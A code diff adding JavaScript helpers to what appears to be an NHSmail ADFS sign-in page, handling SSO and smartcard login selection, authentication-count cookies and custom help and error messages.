+// Helper functions
+
+function UpdateADFormSubmitButtonStyling(){
+    let submitButton = document.getElementById("submitButton");
+    if (submitButton) {
+        submitButton.style.borderRadius = "3px";
+        submitButton.style.borderStyle = "none";
+    }  
+}
+
+function HideIDPDiv(){
+    let IDPDiv = document.getElementById("bySelection");
+    if (IDPDiv){
+        IDPDiv.className = "hidden";
+    }
+}
+
+// checks edge cases where AD SSO should not be applied (MFA and looping)
+function VerifyAndApplySSO(){
+    if (IsMFARegistrationInProgress()){
+        return;
+    }
+
+    let Office365AuthenticationCount = parseInt(getCookieValue(Office365AuthenticationCountCookieName));
+    
+    // select AD login option
+    if (Office365AuthenticationCount && Office365AuthenticationCount > MaxOffice365AuthenticationCount){
+        console.log("Maximum authentication attempts reached, clearing cookies and logging user out")
+        deleteCookie(selectionCookieName);
+        deleteCookie(Office365AuthenticationCount);
+        window.location.href = ADFSURI + "/adfs/ls/?wa=wsignout1.0"
+        return;
+    }
+
+    ApplySSOSelection();
+}
+
+function HandleO365Authentication(){
+    let previousNavigation = performance.getEntriesByType("navigation")[0];
+
+    if (!previousNavigation) {
+        return;
+    }
+
+    if (previousNavigation.type === "reload") {
+        return;
+    }
+
+    if (HrefIncludesOffice365()) {
+        IncrementOffice365AuthenticationCount();
+    } else {
+        deleteCookie(Office365AuthenticationCountCookieName);
+    }
+}
+
+// Subits AD login form to enable flexible SSO for users
+function ApplySSOSelection() {
+    let currentSelectionCookieValue = getCookieValue(selectionCookieName);
+    if (currentSelectionCookieValue === ADSelectionCookieValue)
+    {
+        var i = document.getElementById('hrdSelection');
+        i.name = "HomeRealmSelection";
+        i.value = "AD AUTHORITY";
+        document.forms['hrd'].submit();
+    }
+    else{
+        let smartcardDiv = getSmartcardLoginDiv();
+        if (smartcardDiv) {
+            setCookieWithTimeInSeconds(CIS2AvailableCookieName, true, 60);
+        }
+    }
+}
+
+// code to set and get cookies
+function setCookieWithTimeInSeconds(cname, cvalue, exseconds) {
+    const d = new Date();
+    d.setTime(d.getTime() + (exseconds * 1000));
+    let expires = "expires="+d.toUTCString();
+    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+}
+
+function deleteCookie(cname) {
+    document.cookie = cname +'=; path=/; expires=Thu, 01 Jan 1970 00:00:01 GMT;';
+  }
+  
+function getCookieValue(cname) {
+    let name = cname + "=";
+    let ca = document.cookie.split(';');
+    for (let i = 0; i < ca.length; i++) {
+        let c = ca[i];
+        while (c.charAt(0) == ' ') {
+        c = c.substring(1);
+        }
+        if (c.indexOf(name) == 0) {
+        return c.substring(name.length, c.length);
+        }
+    }
+    return "";
+}
+
+function getADLoginDiv(){
+    var idpDivs = document.getElementsByClassName("idp")
+    for (let i = 0; i < idpDivs.length; i++) {
+        let idpText = idpDivs[i].innerText.toLowerCase();
+
+        if (DoesContainString(idpText, "active") || DoesContainString(idpText, "directory")) {
+            return idpDivs[i];
+        }
+    }
+}
+
+function getSmartcardLoginDiv(){
+    var idpDivs = document.getElementsByClassName("idp")
+    for (let i = 0; i < idpDivs.length; i++) {
+        let idpLabel = idpDivs[i].attributes.getNamedItem("aria-label");
+        let idpLabelText = idpLabel.textContent.toLowerCase();
+
+        if (DoesContainString(idpLabelText, "smartcard")) {
+            return idpDivs[i];
+        }
+    }
+}
+
+function GetIdpDescriptionDiv(smartcardDiv){
+    let smartcardDivChildren = smartcardDiv.children;
+    for (let i = 0; i < smartcardDivChildren.length; i++) {
+        let childDiv = smartcardDivChildren[i];
+        let childClassName = childDiv.className.toLowerCase();
+
+        if (DoesContainString(childClassName, "idpdescription")) {
+            return childDiv;
+        }
+    }
+
+    return null;
+}
+
+function HrefIncludesADRedirect(){
+    return DoesContainString(window.location.href, "RedirectToIdentityProvider=AD+AUTHORITY");
+}
+
+function IsMFARegistrationInProgress(){
+    return DoesContainString(window.location.href, "&wctx=%26LoginOptions%3D1%26wa%3Dwsignin1.0%26wreply%3Dhttps%3a%2F%2Faccount.activedirectory.windowsazure.com%2FProofup.aspx")
+        && DoesContainString(window.location.href, "&wtrealm=urn:federation:MicrosoftOnline");
+}
+
+function HrefIncludesOffice365(){
+    return DoesContainString(window.location.href, "&wtrealm=urn%3afederation%3aMicrosoftOnline")
+        && DoesContainString(window.location.href, "estsredirect");
+}
+
+// set selection cookie functions
+function SetAdLoginSelection(){
+    setCookieWithTimeInSeconds(selectionCookieName, "AD AUTHORITY", 8 * 60 * 60);
+    Login.submitLoginRequest();
+    return false;
+}
+
+function SetSmartcardLoginSelection(){
+    var i = document.getElementById('hrdSelection');
+	i.name = "HomeRealmSelection";
+	i.value = CIS2URI;
+	document.forms['hrd'].submit();
+    return false;
+}
+
+function AppendGoBackMessage(htmlElement){
+    var signInWithOtherOptionDiv = document.createElement('div');
+    htmlElement.appendChild(signInWithOtherOptionDiv);
+    signInWithOtherOptionDiv.outerHTML = "<div id=\"signInWithOtherOptionDiv\" class=\"groupMargin\"><p><a href=" + BuildGoBackRedirect() + " onClick=\"deleteCookie(selectionCookieName); deleteCookie(Office365AuthenticationCountCookieName); \">Sign in with other options</a></p></div>";
+}
+
+function BuildGoBackRedirect(){
+    var queryString = window.location.href.split("&");
+    var paramsToAdd = [];
+
+    for (let i = 0; i < queryString.length; i++) {
+        var param = queryString[i];
+        if (!DoesContainString(param, "RedirectToIdentityProvider")) {
+            paramsToAdd.push(param)
+        }        
+    }
+    return paramsToAdd.join("&");
+}
+
+function BuildCis2FormActionFromUrl(){
+    var queryString = ExtractQueryStringFromUrl();
+    var params = queryString.split("&");
+    var paramsToAdd = [];
+
+    for (let i = 0; i < params.length; i++) {
+        var param = params[i];
+        if (!DoesContainString(param, "RedirectToIdentityProvider")) {
+            paramsToAdd.push(param)
+        }        
+    }
+    var updatedQueryString = paramsToAdd.join("&");
+    return "/adfs/ls/?" + updatedQueryString;
+}
+
+function ExtractQueryStringFromUrl(){
+    return window.location.href.substring(window.location.href.indexOf('?') + 1);
+}
+
+
+
+//// Add message functions
+function InsertAUPMessage(htmlElement){
+    var aupMessage = document.createElement('div');
+    htmlElement.insertBefore(aupMessage, htmlElement.children[0]);
+    aupMessage.outerHTML = "<div id='aupMessage' class='groupMargin'>\
+        Sign in with your NHSmail account to enable the \
+        <a>\
+            NHSmail Service Update.\
+        </a>\
+    </div>";
+}
+
+function AppendForgotPasswordMessage(htmlElement){
+    let forgotPasswordMessage = document.createElement('div');
+    htmlElement.appendChild(forgotPasswordMessage);
+    forgotPasswordMessage.outerHTML = "<div id='forgotPasswordMessage' class='groupMargin'>\
+        <p>Unlock Account or Forgotten Password?\
+            <a> \
+                Please visit the Self-Service Portal.\
+            </a>\
+        </p>  \
+    </div>";
+}
+
+function AppendLinksToPortalAndOutlook(htmlElement){
+    let linksDiv = document.createElement('div');
+    htmlElement.appendChild(linksDiv);
+    linksDiv.outerHTML = "<div id='instruction' class='groupMargin'>\
+        To go back to the Email <a href=" + OutlookURI + ">Click Here</a>\
+        <br><br> To go back to Portal <a href=" + PortalURI + ">Click Here</a>\
+    </div>";
+}
+
+function AppendPrivateComputerCheckbox(htmlElement){
+    let privateComputerDiv = document.createElement('div');
+    htmlElement.appendChild(privateComputerDiv);
+    privateComputerDiv.outerHTML = "<p class='groupMargin'>\
+    <input type='checkbox' name='publicComputer' onclick='tickboxUpdate(this)'> \
+        This is a private computer\
+    </p>";
+
+    // initial settings
+    if (window.addEventListener) {
+        window.addEventListener('load', initialiseSettings, false);
+    }
+    else if (window.attachEvent) {
+        window.attachEvent('onload', initialiseSettings);
+    }
+}
+
+function AppendSmartcardRegistrationMessage(htmlElement){
+    let smartcardMessage = document.createElement('div');
+    htmlElement.appendChild(smartcardMessage);
+    smartcardMessage.outerHTML = "<div id='smartcardMessage' class='groupMargin'>\
+        <p> To register your NHS Care Identity (Smartcard)\
+            <a href=" + CIS2MatchingPortalURI + "> \
+                Please visit My Identity Portal.\
+            </a>\
+        </p>\
+    </div>";
+}
+
+function InsertLoginErrorMessage(htmlElement){
+    var errorMessageDiv = document.createElement('div');
+    // sign in message should be at the top
+    htmlElement.insertBefore(errorMessageDiv, htmlElement.children[1]);
+    errorMessageDiv.outerHTML = "<div id='error' class='fieldMargin error smallText'>\
+        <span id='errorText' for='' aria-live='assertive' role='alert'>\
+        </span>\
+    </div>";
+}
+
+
+// Custom error for failed password changes
+var errorElement = document.getElementById('errorText')
+if (errorElement && errorElement.textContent === "Failed to set new password. Contact your administrator for more information.") {
+    errorElement.innerText = "Failed to set new password. Your new password might be a commonly used password and so not allowed; please select a more unique password."
+}
+
+</script>
+</body>
+</html> 
